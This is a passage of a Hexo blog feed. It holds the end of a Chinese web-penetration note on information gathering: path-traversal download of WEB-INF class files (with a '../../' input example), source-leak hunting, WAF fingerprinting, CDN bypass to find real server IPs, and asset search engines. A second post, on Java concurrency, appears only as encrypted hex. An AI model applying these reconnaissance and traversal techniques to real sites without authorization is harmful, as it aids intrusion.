<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">若存在WEB-INF/web.xml文件，且有file access权限，可以在web-inf/web.xml中看到暴露的java class路径。</span><br><span class="line">比如在web.xml中有cn.abc.servlet.DownloadServlet.class,如果有下载漏洞，你可以直接下载web inf/classes/cn/abc/servlet/DownloadServlet.class</span><br><span class="line"></span><br><span class="line">如 upload_file = ../../xxx.png</span><br><span class="line">即可访问 upload_file = web inf/classes/cn/abc/servlet/DownloadServlet.class</span><br><span class="line">并得到class文件 -&gt; 拖入idea查看即可</span><br></pre></td></tr></table></figure>

<h4 id="cvs泄露"><a href="#cvs泄露" class="headerlink" title="cvs泄露"></a>cvs泄露</h4><p>网站中存在.cvsignore</p>
<h4 id="GitHub源码泄漏"><a href="#GitHub源码泄漏" class="headerlink" title="GitHub源码泄漏"></a>GitHub源码泄漏</h4><p>一个利用思路是，可以在网站中寻找一些联系方式的信息，比如qq,wx,phone或者email，然后在github中搜索，可能能找到源码</p>
<h2 id="WAF-amp-CDN-amp-Real-IP-Address"><a href="#WAF-amp-CDN-amp-Real-IP-Address" class="headerlink" title="WAF &amp; CDN &amp; Real IP Address"></a>WAF &amp; CDN &amp; Real IP Address</h2><h3 id="判断WAF类型"><a href="#判断WAF类型" class="headerlink" title="判断WAF类型"></a>判断WAF类型</h3><p>Web Application Firewall简称WAF，WAF经常会拦截到我们的渗透攻击，所以需要判断WAF类型以便之后绕过它</p>
<ul>
<li><p>直接用工具判断：</p>
<p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
</li>
<li><p>根据拦截的页面判断</p>
<p>参考资料：<a href="https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ">https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ</a></p>
</li>
</ul>
<h3 id="CDN绕过并查询真实服务器地址"><a href="#CDN绕过并查询真实服务器地址" class="headerlink" title="CDN绕过并查询真实服务器地址"></a>CDN绕过并查询真实服务器地址</h3><p>CDN：A Content Delivery Network， 本质上是用来加速，根据地理位置不同分配不同的服务器让用户能体验到最好的访问效果，同时也会对hacking有影响–因为隐藏了真实的ip地址</p>
<p><strong>判断是否有CDN:</strong></p>
<p>通过网站在线ping，看全国（全球）各地得到的ip是否相同，若不同则说明有CDN</p>
<p>推荐查询平台：</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">https://www.17ce.com/ </span><br><span class="line"></span><br><span class="line">http://ping.chinaz.com</span><br><span class="line"></span><br><span class="line">https://www.wepcc.com/</span><br><span class="line"></span><br><span class="line">https://get-site-ip.com/</span><br></pre></td></tr></table></figure>

<p><strong>获取真实IP地址</strong></p>
<p>Ps： 如果不确定哪个是真实IP 可以查询IP地址 如果是cdn节点会显示 或者根据公司在的地址判断机房位置</p>
<ol>
<li><p>同服务器下的子域名可能不会做cdn</p>
</li>
<li><p>去掉www可能没做cdn</p>
</li>
<li><p>邮件服务器，若邮件服务器是搭建在网站服务器上的，那么可以通过注册账号密码 -&gt; 服务器会给你发送注册信息 -&gt; 显示邮件全文 -&gt; 找到ip</p>
<p>例如在gmail中：<img src="/image/information-Gathering/image-20210601164900369.png" alt="image-20210601164900369"></p>
<p>可以得到发送邮件的IP地址</p>
</li>
<li><p>证书查询/根据网站备案号</p>
</li>
<li><p>历史域名解析：过去可能未使用CDN，可以查到真实IP</p>
<p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
<p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
</li>
<li><p>工具查询cdn：fuck CDN</p>
<p><a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p>
<p><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a></p>
</li>
<li><p>APP抓包：若网站有相应APP，可以抓包APP来分析</p>
</li>
<li><p>国外访问（针对有些国家地区没有设置cdn）</p>
</li>
<li><p>接口查询 超级ping</p>
</li>
</ol>
<h2 id="Black-amp-White-Search-Engines"><a href="#Black-amp-White-Search-Engines" class="headerlink" title="Black&amp;White Search Engines"></a>Black&amp;White Search Engines</h2><p>推荐网站：</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">https://fofa.so/</span><br><span class="line"></span><br><span class="line">https://www.shodan.io/</span><br><span class="line"></span><br><span class="line">https://www.zoomeye.org/</span><br><span class="line"></span><br><span class="line">https://quake.360.cn/quake/<span class="params">#</span>/index</span><br></pre></td></tr></table></figure>

<h2 id="ARL-Asset-Reconnaissance-Lighthouse"><a href="#ARL-Asset-Reconnaissance-Lighthouse" class="headerlink" title="ARL(Asset Reconnaissance Lighthouse)"></a>ARL(Asset Reconnaissance Lighthouse)</h2><p>配合fofa可以有效完成信息收集，详见<a href="https://leihehehe.github.io/2021/06/01/arlSetup/">Web安全之ARL灯塔搭建与使用</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Information Gathering</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Information Gathering</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Concurrency Concepts</title>
    <url>/2023/06/15/Java%20Concurrency/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="38efeb4122db83c71d55f3685451c7474e6393e578d2230d6ce2c15781723088">cd0f823baf90a976c0e289ada245372b93026a42bd5bb577c442982cdb8eb9bf6ab972dc80b0da877a000ab20716f98a71d374bdeaea13f4a3fc44489e6a7cb6584d6010cbb1387cba37258ce123d5da72ff68ea4af5d71f81631e6428e51a2dffef6bddeb158216766183f797d0a061749d33b2220327958f92a23fc99cbdcf0dda2324b1dc4f94db387cf97b9d2ca8b3d4dc8870afd0bec4fa63920590a561beb11429829b6a72e76e51fab5044d17ad021151dac9fccf3edd57857d26ae1d5529064eb3ea401ee284b102b8dd0e84b9bf0286b030be0a069f2d155f4305f761522721a3ee9329ee21457f8e6eccbb0e6a2a6ad4726c61a2c081ec91631531cd4d84cad7e0006ebd0cedd3df239da8ef210754b82903bf8bd9d7c75af6c09c9efb702c86447d95178e37163716e34d675f5cad318f7789d6e85c6c26ab19a7cafc4c393e73a5e1b92d09d5caad7c388bcfb874ccfc78d67a0112b28c2a8b9c23c4c67ae5762e27e76c39bfa2e8ad1cd7b013e5fddb82ab80e9bcacbb0bb907e1b94ed8bb687301b4a3950ef79852cbb9e1c973e4dad356a78366feedaf80fbb54948bbb01398549a73fe79ac680bac4e15babdd72eddf25c3386deba3eaa0f5e07440d619f59d9f6195a6b0efe0613da6b990f5568629936e4699964733cab55f868694aa2ddf1f20b4430ae54c7608df43eef083fee73463a5d8a12e740fe8ae6cde11a376ae7539a4d3e439b7e2b93675bec65742650881c8a67c397929ba745b6854921fe4fe57270eb996b380517835c55ae8d19d0a14991cd121ce61a5477776e523d103bfc038a5149ac3a99f1e40907cd03883df811f9c9334920d51563b1175737d5406bb9b089834d9cd5d97816116014d2d4041e95998d0224445fcbaa1da993f41d43cb4137ee94afd521a1aac913df2f13de31dee033708ddc0e24afc9fd7cd4d21207733897f296b00b3f478c50a1dacf2a02c76a1a709cae005c2fe52ba424a670a2cc17b1c1e0bf33005628b8bb50261cd6b64e3ba16b1ff602feb4c11c512d6a2e265f184187662363968eb5ad27c34030953ca228ad7f76878abab03ad7d483a2e9ef11208e7928687cba25f37442d880ffc617ff084f2b4ea1bb9ebe9da5a41b8129d0bfeae1dd4a195408c0bd6a15331e1b75dbeac47bca5b9d197d49faf78af165fa7732dfae283eaa35af285664efde12f7a509d19e8af0977fcf9f1c7fe168feafc449c96f35c9aacaf6d8f1be23d473253309a0802075de311e81895ab3d72e904ce15916164cbed71fc28ac50c2a43fb3f1b822179728c3a738273ab95ea632d31b400dbdea8ce0eec50ab6f04e530a6de27cfccdfdffbc6931debceb58898497212c1d59918b99c0485dd83bf1dafddf777846083807279039b42e5c55c80d3c10c3b9673bc9fe6aaf60227b6db272c8b968b2d98682a83a996e8104f3bfa12bb2783224e31e5f05abd5aef89f022bb0d10baf8b657d3ba78fc1c3364a327a750ebee71c399a96e691017a9ea053edd6994641db86583d152ff6d20045135184911df441b64fb353c5582c7a6dbd3f55aa38440b2cfeb46ecfda0b882d61623e6818f30a47a55a672d1ebe519ba77f3f1b1d6c619d6742e9fa602c50c687ec563e39416222a380b1da440dbd093d1b78e5b9d5de02fe137c5e6f9c4404d8add383fab7f4c680326ee28252f35513cda9e0a925e4a4739456e02e96f445e82e6911b622634debb5fb6df20875a10dde1a0031ca9f020146ca3ae2f6762e5a6e5af385cd20e5a540a6374201660ac08a38283e6df4a5e466d5d7c478074430ff49e5bae52a3d466146762f20cba8227c34c0533a66959f41b166702942c16458bc6399257e695db2374f6f6ef5ea70a2ca0e84f7f87c7f2291e911f047a8b8ccb649106e960e7e0fe966f69d165bcd766a6e756cdf401fe72a9588758317d9ef5f63af2b6f06ac6632071e8750a935ebb00aade3bea2139fbe2eaee7bbbecf06b5ddc4f8fddf6993b0ee08dfaee0acba03a0e76d2c147231a5e269270cbf5c7d463a93aa296b4193a462ecc6583865c54ae26a3fbd653883e4f0159b7fbc08cc7b84888251d78d2366212c63c76f3d0be7b0419b6dff32cdf6563d19dfe4b9ca7c655c5cd83bf20dc851c0214514cfd17cbe1017b688d1ecb8e288800b0001363a565924ee1aa76db24016181a73d39503e9c6e3b2b8a61a5f227da4b94e9be58d99a0276eaf5854f2317148cf3aadac9809007d632cd96062def23205c44c30273303ecd93ecda85058990b801eabbf84d2089db6ca2992ce1176464489f3bec79d83fe4270c5149e42455f11429f6dd4df90c2857605395a81b6f74c97b67af751a60b5f915b8927c099e07f63acce1fc606eda2a297a978f120bf5e731cd0173b50445eb4faef773a2d3f0599c15df548454384c457e6782d74d9bd7335b17ea6eb639059f579ae42c6e21ea97379cfa34aa2fc5177117482d4ca05960b167a67865e1bc810d191fde2debdcd556c48d7bbd6d78b04b374ca4faf284416cffe9da3f6e9c0c23a29229dd1b5b959367d5f2b8d6a0fa7240ad479db64c7ebd023a1704899e56cdebd9f1b7ed3c3bf98e0ca67b0a87e546f398966556acacdbc559a667a6ef1748d9ef25cda546634be74525982848f9b4c77c5ddedae7b2b16528cee8d2c0413a217c20b53bf6fca5e0ea1b2a87bc8107366f80b575c98bdd0c0885a91ad8472f3ae32001c34ac4ee7b41273467b0419dbbcd044f1b9fa7a9096bab57f8e6a613bbbfe35559d9a84e8f1b2fbf941505b6d01e4546a6affbdbc7c05b4f172b03e93fb27faab591486d3926b1a51dbc99d82601da76cccb533318b9108b527076e5e5eb5f3e79fe6da6c6e30a352542b8a918e046ce04420cc38faff83cac7b4f35028edbbe66a16d977261b61273a2eeb6f96fa10f87b90bb649debde7d055eac4cc62c77fc7cd2cdc7a6ae83395cb56f88a0ca1e795237ce64f95dfff466f6b5d766cbf67e791342946c0db94b12d5dfb85a16f6d2b5a113ca7304f76414d6785f504659368bf33f6bf4a74fd46f2a2603b87eff7039e9cd0b1b19ff053c54684a814135ea1a0732f4022af0431bb0f0596f651786c1d741709dab9e4b83f21b822d34144c3b2397bd5be913fcbce0f058e49a644b98aba3bae602c2607e0adf5e89146bb60c93f79e1aab685e109acb8792e0092d572756afe6b1d628d7f0657509b9cb49311fd18a5c0984e56f198a4ec48f9957c0b0a068c8c0e97358a3e13f7f8f4f3a772ff96449385f1d9ea8a4f6034f96c2b1e98f4c0f9ffc36168f1783944f0874e0102d818bfc05c213048abe45f76f229d257e7d9f0ed87a1672fc9c19a8b08ea54d188149f1e57ec2017536643c7775b928514cd9c824c48226b7f8471e070bde23167e37175259928e463e086cb7febdaf2961be216a17539459735ab2b860c32bec557225741d36bfc922ca5e1a1553f43a717c78308da0c6a61f4fd9011a47a3a3ac49fb4bb2bb80f2e23767df67b054311d2f4df22cfdedc039bb806ab150213948a59f0fc2a49aee9e7314968d781cbf8f0b7d614a1b3314d3ebbec707189cee671ec4f3e39898059a11c24425c9fc8edc6aae7e03ec43793ab85ca681e22da41f3410166febc6a009c804779f6908c3579a8b029bd871ef4ebc9175c6d9b6c0c75f7d0842aec86b9abc9606a7a69ca9be353587747f872b93432dcd4b5edb5915cab4d5199eb350f5d74bb218483693fd189ae2d305ea0916e9ed02b8a92dc0f247aec7d8f41c20dbee755ad71469d42d0aaaf0ce48e412546a27560c6b31c43f94cb2c1034ffce476625896e4c64a627334408d0cc9d7a3a90cccbb710f487eb71e1fcc9e6f3130227f661735528a3f85129bfe31484c02c14aa029ee72e07dec0ada2a82a3c4a5d46cfe3ab22f56a5c39504f2038a0dba573a18cb55889770331e0295b7e121a86f2f09df1465ca88c7119c060c92fc790ba607ab744ad785a27399d35812cb1c9498b25305d3e1aa3172ba40e5c6d288095414d85471c7c52ce6a23646e50ec99039ceb755da122016123402abd4941c78ddf945ba73884a342466b18ff0273df9a99867594b30bf0d10c37ffb83b7c2dd88740f1c0cdba7545bb834a9e379afd414ae02547ae6e67af435f28517c612b0e142955e25812277a488bf8faf15f440d7ed5da893166c1543d4405a231a5876e3706318634521485b345cebbce1bc224d01d2ad4875c57d324fcf8c23fe090c095b3a02c6f45ebd54e02f492f151a41d2e419acbbd55efd0d22b56410c0e67f4cafdee6af28162ac479c1e8a0d8c9d589470cadb0789edbae9d6e098919a118b84a80cdcfcafbb9cd45b48568c26e4c74061380a284c9ebdd79f9975dbb4e3557799ea45b7259e3a89375b9f546abc8a2c0b915f78a1310c5c3e9c657f169b5350c31e92f5e637cee92c4ebda56cc5b8b36be8d752985f95dd2682c79f882de95e61803345002b55a6e08042d9c5dd8e5e13c56b64b6c97bb217a425dabecee1d8d12ca4c04903e79a0cd1c88562c7e49b78794625b6000d11f7d55d5621302aea5304b0f702d0e7bffbe064e23352a0421b2a38f545311ff291da43c3f5b1b5b97a5a609947b830c9b27f38164875b7f0ee8a6827b67fe0ddc31bfba8929ca0d2597803ede2fc3a4714b519bda90fcc72677d0120a23360b8063777a03b373a646924c8b003868a968d9f9290ed8822e8362794fd8f401c045296c05d76f1e28b04027572fd120b7794cca28c2c337614674b6d1795628b733c3360df47c5ac31ce7d6122bc5707a355e5cbfea21069960c26dc366ba065b0aa946dec0843ed251c55d36a2f1f86bcf0c90990db20131db6639339773e9a7c3e9e95c9dd00cbfe216b337b5d315817935ea432d940d98411d7b315ed0c2abaf1dcef2835d3308fc4883c27fa99a79bde5454d4aea4e0c4f8b09d8ac5419784973695ac64cedd9a35b41a95dcee94deaf6eb6db2a78d6c51a4c1bebb4613e7d6fe0f9cc1849de6404c0c6d198b283e32a7fecefb5f145881587751671b2d390db607eca3210271f31868937ff2046a7814c4250fd2a5c9571cc1106e9aebce7bc874e3d18357e647b0011aae2645f30db75c62b0ec7a3acbcb0f9381e2518ed9155e0967ddc6b9042dceba9fdbfc7f0f2ff05a0ffb390b337b8960fac87b541e5f2fb2c0a271a4a73622ecb8048cc4a1de1a7b387a955e89871f1e7eefc056192d22abdff07742dd82cf263c4a3497fc45e3ad5669660931244a344aa39c5fe053a27a967b709fc0d78fa3be58424063c6d8d2a9076e03754fd75cc6bc2065c86ef9c9d29840fbc0db1b26ee076bc369ab5aa41a25be7f0ce34ccc9e612f6cf347523c7fa3bfe75e220ee098267ea56a2a1a170fb4bfbc5fae2036dcf6eab0c27511599e1c676a97726ca16918788c3112f6ecb78c4bee376d779bd4816961cff2741f6e83bcab2d61dbb9da351b79957b6d9e7241c605e7444fdece547a15801499e622048392894cd925e449884ed75d2d242fee3f292ebb93ad5e0aac4adac18b7feff3bfd2af4c854bab029a36c1b7fa699cf2f0b2ca7367fbcfa554bef02872ac33596cf59aeef191c792f6dbab05ab2a01c4c2e7c26a7678b3267b7c2e00f450e421a74d936e0d07db9070c97f9f8f554d547ababde010422c5590a64bc84edcac4a7a9df8d80aab35510c5ff24b1c40e5d213b8bce52410ae47158f05e3789affb4afee6e6ab9538dbec12624836d6e93482acc1d64b4a48c7960bbb49687d55ae12067633cec4a3e056a0e45bd74f015df59cfe7cb9bb56acd6326188f49e6224fe24a62fc90c484b3c06111b83f1ba1f41d0052594a47a8c792aad449576957581007bfa19a6ff0c65979958902bfd1d2c9aac2cdf61c4f897bc2786255987eae43b7aea57cfd8c105b147d3b8c1d3d928af0cd93ea1df70c700821b2baa022158f0b711d47f8714979b0af6335530f131099da903a37ec23546741682230174aa4e0f34259b9bf10cae5d18532314cf97aedd4e5e9fc7f8d8768067addceaca83dc161b6017c530e848af09cd50e3fc30c3eaba8af3ec7f7770b12c5216dd9982886fdb8cc72704bb5da97967e3d551fe697b300867ca151101623f5038e42779708a26490fc83c87f54af9bf208257b9afbe8ec718703ca711b3c6f974cc00658a32e6ebf5d0c28d57faca858111712c35d6d0738684b5a21c2363ee56b1aafabe27bd71504f5b2a99e85631c8e4f662db265b6dfbb778f43fb5bfdf75d8cdea22e1258091606f23ef4c98a98eeee20040a841a2a289a38da32068e3b0385855b3569fa16aa010cd9728730c6074e12810f4fcef3e6faa5bac22bf34e8f607d11d11cbabdcab125ca10bc37411bead7e58435fd23df8756bb717260c1f3af57ea06f939b39762ba95662095d6637b64edcebc98c11c8f7bd06e631cd5d871cce0136ac2732608b202db573de2a8cdd101b40af1ffc3b7cb43b74449c19da62562cd84f8f32f4c30ccad85a04fbece8fc6d3b0bf89653b2f7c9994b51fd770195971a02206804854314078f3aa1091d870475c2558af17dc64d352d5c496aea54c0c6a548c581cc1b977886186e62d65d8e011bd253d4dc2dcb2b96776f21ffe21b5a1ff2414af3f9761336ed68f21ac26e2f490f6b3f412eadccdc792ba3bf08bdd5516a7b4d3eb08340aacf00cc18e88183525b3c1be72b9011421e1dacd5a46c943a6bc74860bc4408b33aa80d8e617df1008062097a0f418bd3921319ae884695ac9e0b04819e8f6b99bc2b0bb104892a947617178f54a0326aa967e3368cb480012ae3a2321d17aabaa7320d50a39707fa9ad12d365f82d8e5d6f776a0ba5f04bb4ef4a968123e68d5210efbcf7b855043eda29c203fc537093b15835ab4afc60be31dc76658f03ac9162409e4db162b8f6bbc52e2649c7686e7bfcfbc142734d0b0b38240955732b0948fcc46eea5e48a36b2564106123b023ad816ffa5722c127bd9517d966f3620e1abe8018a8cb14bf47e83a5a960b7c95ad14e819e56f1598b0b8ed4554cdffa51f96007d024355687ea02b7a21c6b09c3766250892b8a458f6906ae82ef3a4217ff58d93055b4dfc2e7511b055ecb41a5605d518c07210f3448017d70db4d6fa0a75d9262e10cfdd32e8200b78c0454ce54cc802de7a1c46e3fadcb748fc9d4a3d5396214d34f00e764da3cab1a167d584002ce900a98b4ae14bc6f6ca63e677d82f04ce1a180f522e77245a4e1e92a9c26623b8f68e16e50a1f0fb4529b3c9c2075537e9afc1c72dffd0140210d85c376334c254685578e73e1c50b3ebb7f9dfb560898c716d4aed13e81f1107f2203f8d1e53d90535774227967c68501795db74e7685f70cf20483b3d901dd3f9d945860488a482d808912bb01a3abeba2e621e51a5ab9b2839ba1f151a57777befc01f1d714591d1b187d4055e4cb5a4262f0362659bf36e5214615a35ad73df82db897e09b34a7e6476bc05bf651acefa182b7fe9810652b51be5c0dc39bfe191f57dcfb6036b266a9f2381c56e9fbe5d4aaf6abeac37578a6e9a3f70c160f6ef7da3ae948c33443e1e521782bbda052ed58241598d5daf0649be02d24c1c91193daea22f85eae0a0e1dc383b082079c5f17442d2a7b11150c4c77f26cf3d5239bd71b7748d9e70747cf755b0dca59633eea482bd2cad3cf6dd1b3ebe75ac06924b91abd4334ccb8fc32597e76f3411cece23aa85f1bf98bc5eed3baa942bb8df719ea68a008877b6ffeaf64940d577ecd2577deb117be764226005b181106970e1a7b9a5a674a8f3dbd9ce545a3642e46b35698a9f5c603236f8dbdce04a95c2a6c8e346fb2a4af7dd6eec4d06be58e2e3722bc33f89a50efdb364791b5bc9b6de2d3b848f585d98b044bc95dab12a06f63dcbe4ed631e8c697ab442e9dd1cc009b4a4730368c1b4dba2dfa4da70993586c96f8c295f2e576d55e10152039a62a46b8baf32bdf2cbc7bdbe67279334a08dfd343fab8e378976df370826676cf877f49d6eb5a58144c6878c52b0634b4b5792063ab87d7f76bed9f79ab00ca9f4ec11ab00299b2de3e84f7307324c21e2fc8f407e3d0b5cc662a479957ff4a39bf8274e536394fa71db49e68e29e5ab0f916d99ec83d4d03907f929f81ca35e0da17df4cf645e1973aadf51ab5563e87e4863382eef646496f9fce0b658463570485ed731e534dfad2b5c50779a4b4a26a036f54c44f8b659a38196056085426e66cfc52c47261d4ad188c882c78c8f4c3a8994e8bb2f8e3f5c27943bd1ed20405dbffa86ba4b26a5316d7f6ba52056cbf9e588a7260bdf30befbf43adba4cf8b022194720d502171d61680d7a66d256faf691305bcc07d6b67f1cbb3dd9d7723758aa8d378c9d12dd58e5c28c69360057b5c66a9a938b66cfb13c28f6e6ba05898f0d0b0af86b086967d20ace8c614e80df00488cae586484e7f73dd196dee7705c3c1db8d03948692f94a7938a0eb0cc13f8ae4f52e3380540a4a9b220680a2820bba4d6abc3fe1a06800ecfdf0beb54ec3d240c5cc2420c30cfe479913c3bd88427520b0cbe7c771482b4beebad3cc6f3ca2a001283273a1016d44bb9d5bc9397d71ae4db41057f2dd854a0d25401b60ace60d37de2a161483ae99a1e7ee225751c253c525920e22c5c090c84bfc61d621379b98fc83ac29632814098c062c2e5415169943054bcadc0ad7e038157b7cbeab6918ad327c6d7cdde8158f66ff74b0a73a3d1990423dc9e520923ee653e6e5fa0300da6d07ac5e89e26aea7686f1077711f615025fd70e1be8edacac544b77ad10257948ff60ab44ff2a0974fc8dd1bf5802c991d8e87d6454db4558b8ec00f846cb79b4ab52a1a467d9707276dffa85579bb5e5d9d0118eecbc1bb1b0ca4a3eccd6c906adfd37379ab48cb1d1823f77681b0a6bca13bdf84938dc65970f774847055b1c8f82a6f5a8a79ddec6178c647c9973960194dc67c2d863000d580cd34e2b887ed19e1094bf8426ac85a35463b1297f6db2b6c08f3d0d0976630b9b19363cc0e5df754b5fcfc32a614313485b75a7b2471e5ccebab596c8cb36c66a4dd401ee73aae9b4007870e0f4a2c63bfa0c925c9121179ce401fe29bb0a33d89449a21965ea8c9bc1454106ac353dedf0f9dff4e9e5f9b4e2ad7099e21c19a5cea19a53892afb77e47a93ef2899513e16ee0f19d0dc70f58322eefba9993f3eb3f6cdef84e70e68bcda898e24aa53bbf32a644bb26572008525e81f1058f557aef6ba6ef2a9a510bd599a87445b4e3d57736a799c84295d305153c0cef396d378c444a98547f5a967ae957f274995789ce8e7024ad80b239c3580c7744072c6386fbaa3f8e5efe6f564fd9964cdce00decc94d6d87ced9bd820e76bbd57cc1f3c4d08f5c3e2697fb0ac024b6e3441bbf6fd3fe6c63c633ff86e68afe2929276abba05956e73faf52be6360d515b72fd99641e3b6b0269c769179d6c4aaa08e989aa9e562fec7d0fa4664d9967dfb36358cae7f55c212287789195775efb95b8d8bcb89943bac19647dda7529dab016805e41867f694ff4f3abd8aeb9d77589dd94e4125e23ae3132d69303edae62db25cb2a5f1b38f65ec67586cc204a28554c6345f6372f6ad8d4060a04f4d56bb4d83443107f787bbbebc17631384785bc362384266452498ec0684875807365617b08f5d0ed5a4f17d0be68a400651c83204d29c3ea66a55926827e5de7357f6f4488dbcda190b63f7ff7ad88cdd77403c6c4fe9d2c91e1da41f9a040640907fae20ae154f468cfed08d3fe4a5b594544748b53e95e68c78ee7e8195ec614fae82778eb70c24ffad9ab5f753608f0af1aef6bbe18be9aceeb7d75094ada1df625ee234d8130063d947e3f36b9ac2f8c57383b9e642c1441cd062b0c7ef1099f732e04f8d30c4835ba52334f5b67cd8ab044ac77a4face845b5b72b9d87b15aba442309eecbc5fd8c3b4f7866139655defefd55dba80fe717a8f9ccf980fc710cf35c072ccb4bdc3e2387e0dd44af508a9a91cd59408d575e0c138c3c7b60227d246f7a26595fa1283bd765c868bad573abdb179b9b3b3e20d4d79b616fe1f78d1d2013c1380d55c20a6deff1461c15773388c6aeb835e985f148de13607052a487a2d3f2e175d0455d045dc1ead5f73d77b4d7c759e963865615e1c28864dd1e17f177019fe6a35da4f37e9de6f89f8e964b3bd7e356fff8755bf299d3f9576a484c0ae4aac968765bb2dd23e5e530f4d2e68966929c2a87a8b414a378de0f87816e1d6dfc35170a9a27011ac8c9881154c067428242629f60ee7a1588942f86c4d57eaee09b9bdf3d5162f89d6320fb817a601c02e04a93985f6dc8c450158b24007ba10fa8fba1357f4a7f9931cefd85c6fb3800d2bd61d7c571c1b1eb348f6a4d239b6e704dbf9666e3e06944ebf4ca677fbd34f274361e863bd96c932b3097e606f81c8cb9911cca01e8a1dbb6ce845ae908c3bbbc754ca910aa761d35841c543a007e9e3c14a305e71085e1a7c55972f8f374d18a683c0eed60b024a4aab77e287a0d3694c1bb7e2c39a09c2909be9d26244c7342fe0340f30c39a6fd4a726a56ba56398fd271498526e73a6296950c9163e28891d7ad1c991489ce05b3b88970b7a88628bd0a6417823e52c731f3e5b9fa499c323b0249c4dfc673afa5e0c3f1ee5f125f8bc2b89b6f4e164ec952b99882c7e36b0be889141b924e88e849d6d45b9571be081f2eebcec2426d296daad8e34f68c60cb632092640f98c18257ce6ddee80dedf4d431e579de738db7d229d96f73ddeeefb70d144668cc0c187824a20cb860f0b0c49f211b266fecafce34eaf6db82c8d792ff4c16ef9fe991963bd6237771d5d4d9677a69fe6ec153d19a86bab44031cb947861b1199c121f255eba83f6d7a52093d7eddf70a824f45b78912da9c70ba2f526afbdfa0387bb4f30d8729cd3b50516fd4c7c594b6137aec5339d6cc97954b680b486407d61bfdcc307238a8ea4ff20c05d1f3e3e76813b4ab107d312ea5148b4ae9e0ccff529d8a0d88480b8eba455d8f349cae3dc80d90847c1a14fc92deb11d5d39d8b71ae92d805ea8baa28a77a5a125784b991ac73679b2f0fce94e055bd37df7cdd3444e8d35e1c23098c94b0d3e204d2fed030c13e1dadd930be321ed4674dba925bdbc35c588c007255f9f1f67e6c48e34772f9c0b8b8fc285983e54ac55a8a08ddeae80d7b6ab373ee700903c9461691fad47af4cf5cbfcfee8e4db404acef1b17dea18a6c8fe88f8f51713fa4c363bee682bbf312fa00a4e877bbf70192c45bbd4eb3b93ae6bb55548bf5a6a8f43a0aab1773f76d56da7e105cf0f47dbabdded183c4c589dee1ba0dc6d39c38ccc7b6df1c0546610122940a6a9da3800bedc3b28f06fb9ac7dcb43304e31087300b008ac5d0827b4bcc1751688d35af667a14d3cbe887c4faa79b11ea913baa22bcb83f57956ea0256acc159fd2b92b3c373ba15f3414f1ccdae437ebd6218afc555c75e6fa79a4a0af291569988b6a653940ee608eef346089715b658dd7292792172978cf91d9beb53f291b7056a49be0e244de754f2d9bcf796833260dc09f9935714ac557bc7fe5597c5ac4f9a1fe5c54b80323dddd802a8edc12d2aa48a24c2e74bda662fba499a9a95076efcce33827d36032ce44542b7f3625a70f5a884c85a7707ac2e3582d5d13000d5673e18be204453ce21d92682b49166c3c9923f278efa8147cf9e4b02886aa09786e059b8e991ed9dcbabbd5edaa9be3d1352013348bbe9d9000e4e59503be6de8a6a54c37d370430a28ce97ad43863d29adf468a697b1e76d6fbe3b1cd6ca1f1d4cfa78afbdfc303575fa3c01482d9dffc4a9c8c0c706c0d6a16822fc3684e1bfc50dfc8dbe38a1f958e04382678b4eb60fc7f2887c0500b95534b1cf0a934e65914ddc8625a24730a4dc32f17eb3761575ae9bc8460a1cba53d3bdcf6c57b819400126b8b03797173003dc30c791b40060b519f7dc366b0292a394a4980a2f13d67e5ad4b2b31dfc60e9722bcb98663c619b7037e97ff14447d48b53921de072135fff14ef7e94aa86ddacef9f9255186e1171d8176c10bfff2ba32b368d0b7cd3bb1c50bd0932df96aa78d6f623671e02338a183baa8a381b8b396049dccb05ec88f6ed4774dfad6ed83e1b7ed9309d21a85a477300dc31bd3e3c80f570bd13687d4419a5a74352971dc87c86105870ef5713eac4f94027ca3b04b416df2d0b0f22aa0262a46a2be1e116911f79e394a5eed98be6c9f989d5ee474f54595852d61f77989c0f41028c3da344c31081795f1cc68539584ef72371d83e861d3dc181898d036dbf1ab17918dce3c64f864404f3c8c7481e4c6f587c4c25c34bb323e1a7aeb19f3bf6b277fe21d62ae17da3e0c260a9c85511e91afc6854cf1abcdb63fad95ede9a213f5e850b65d44506f28f2b8082f3f664e8115c4e998e6e48e52d061d1779ea7ed802630e6ba05498cf48d5f590fefc8542f32e45d7b7baf30069c343912d11d0dc40a48e4beaacfd7949441c6cec3a1703a2d066255a5f8eb17c2581d4eb07e6a6845f0d1614ae284c0a76f1af21ae7a195498d7febdd4cb35bda3566957e01c8c173f84e9af17311f1fe486b83a15775f52b42219f15607a85f47a07d43a3117ff2c5a5b00eadd65a0930dcae52688de9a5cb2d4a061ae8b074837e9f361a05288dcc7a153d71a13391cc78a99685ad5e83ada004fce280fb38a7322ca23336ba73bd383ace2f5fd8b883f05be02879a37618e688980365dd7e662afa620bdb733bcc47305812767583e1f37b506f08cc41b57d4d62b924744ec487c38edd64bc4f323b59c265f6398b222aadf48ee5d7f4787c3ccb3a9ab7e4110911402bdd532b01f2dc70226b9732e5a0e6c7ed5f083f6afbcece2423306ed830662ae91b4cf8ef1caefa004b58d8a9c24450b8cdcfce50b6df2bec445f64410c7cde137950a2e991e1ce7f9c03ee769c7bf42ee684d449afca348f41b7ac9de7ca53dd4ea8b658f9aa8e4b4114a6bb2cd6c3339c3e8cc808ce41f974b58aceaa436e5aa8102ce6ce5b07235c1db18c7ae99f9ee801bc2e69ad0b170653363038b3726a46658885c5bb2190e13196ad7b2ae683570205797fb3cb5d50c7e9ad672b8b9a0eda31f9e16843aa5beaab0527edd210679442b0996eb5db013a560c8e1a71b2c10199b5b5b6